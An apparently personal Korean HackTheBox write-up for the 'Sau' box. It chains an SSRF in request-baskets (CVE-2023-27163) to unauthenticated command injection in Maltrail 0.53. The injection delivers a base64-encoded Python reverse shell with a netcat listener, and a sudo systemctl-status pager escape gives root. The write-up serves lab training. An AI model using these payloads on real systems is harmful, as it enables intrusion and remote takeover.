---
slug: "sau"
title: "sau"
date: 2026-06-24
category: "HTB"
tags: []
excerpt: "일단 서비스 구조 파악하기 위해 `nice` basket을 하나 만듬 토큰을 발급해줌 `4Hrac4di9aTVlYpiuo3MWuOaoiVmFILLkB1JZ_fWsYdd`"
readingTime: 6
---

# Box: sau | Linux | Easy
날짜:2026/06/24
소요시간:

### Open Ports
22
80  -> filtered
55555 : golang
### Interesting Services
55555 : 입력창이 db에 뭔가를 넣는 느낌이라 xss 시도했는데 bad request 뜸
~~~
invalid basket name; the name does not match pattern: ^[\w\d\-_\.]{1,250}$ 
~~~

일단 서비스 구조 파악하기 위해 `nice` basket을 하나 만듬
토큰을 발급해줌 `4Hrac4di9aTVlYpiuo3MWuOaoiVmFILLkB1JZ_fWsYdd`

burp로 basket 안에 들어가서 요청과 응답 패킷을 봤음
max, skip 파라미터가 많이 보이는데, 용도는 아직 모름

### Initial Foothold
**벡터:** SSRF

**명령어:**
반드시 footer부터 확인을 해!!!!!!
얘는 requset_basket 1.2.1 을 사용하는데 여기에 [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163) (SSRF) 취약점이 있음
~~~ exploit
[Attack Vectors]
POC: POST /api/baskets/{name} API with payload - {"forward_url": "http://127.0.0.1:80/test","proxy_response": false,"insecure_tls": false,"expand_path": true,"capacity": 250}
~~~

그래서 난 curl로
~~~bash
curl -X POST http://10.129.229.26:55555/api/baskets/hack123 \
-H "Content-Type: application/json" \
-d '{"forward_url":"http://127.0.0.1:80","proxy_response":true,"insecure_tls":false,"expand_path":true,"capacity":200}'
~~~
이렇게 페이로드를 작성했고 `forward_url`에는 url에 있는 사이트로 해애서 변경, `proxy_response`는 응답을 받을 수 있도록 설정해야 해서 다음과 같이 작성함

**전체 동작 원리:**
```
너 (Kali)
  │
  │ POST /api/baskets/hack234
  │ forward_url: http://127.0.0.1:80
  ▼
request-baskets (55555포트)
  │ "hack234 바구니 생성, 요청 오면 127.0.0.1:80으로 포워딩"
  │
  │ GET /hack234 접속하면
  ▼
request-baskets가 자기 자신한테 요청
  │ http://127.0.0.1:80 (외부에선 filtered라 못 닿음)
  ▼
Maltrail (80포트, 내부에서만 접근 가능)
  │
  │ proxy_response: true 이므로
  ▼
응답이 너한테 반환됨
```

- 80포트는 외부에서 `filtered` → 직접 접근 불가
- 근데 request-baskets는 **서버 자신**이 내부 요청을 날림
- 서버 입장에선 `localhost`로 요청하는 거라 방화벽 우회
- `proxy_response: true`면 그 응답을 그대로 너한테 돌려줌


이제 http://10.129.229.26:55555/hack123 여기 들어가보면 `maltrail 0.53ver` 이 있음 해당 버전에도 RCE 취약점이 있다고 함
~~~attack vector
maltrail 로그인 페이지의 username 파라미터가 입력값을 검열하지 않음

인증없이 원격으로 명령어 주입 가능

소스코드가 `subprocess.check_output`으로 username 값을 처리하는데, 여기에 `;payload` 형태로 주입하면 payload가 실행됨.
~~~

->리버스 쉘은 base64 인코딩해야 공백 문제가 생기지 않음
~~~shell
#리버스 쉘 여는 애니까 cheatsheet에 잘 기록해두기
# 얘는 그리고 sh로 염 (가장 안정적임)
python3 -c "import base64; p='python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")\''; print(base64.b64encode(p.encode()).decode())"
# base64 출력 될거임

curl 'http://10.129.229.26:55555/hack123/login' \
--data 'username=;`echo+"<BASE64>"+|+base64+-d+|+sh`'

#리스너 공격자 
nc -lvnp 4444

cat ~/user.txt
0ff6cffd342284629e76753284f84d70
~~~

### Privilege Escalation
**벡터:** systemctl status (CVE-2023-26604) 
**명령어:**
~~~sh
sudo -l
User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
~~~
해당 systemctl status에 CVE 가 있다고 함.

systemctl status는 출력이 길면 자동으로 less로 보여줌 근데 이 less는 sh 명령어를 실행할수 있다고함
~~~sh
# 터미널 창을 충분히 줄인 후에
sudo systemctl status trail.service

# 이후 less 뜨면 !sh 입력시 루트 권한으로 변경된 쉘 실행함
cat ~/root.txt
ab935e31ccfecfc41e0d0c1ddfc8c996
~~~
##### Rabbit Hole (막혔던 것)

##### 다음 박스에서 써먹을 것
- ssrf 공부 해
- 반드시 footer를 잘 확인해
- 반드시 sudo 후에 cve 검색을 해

---
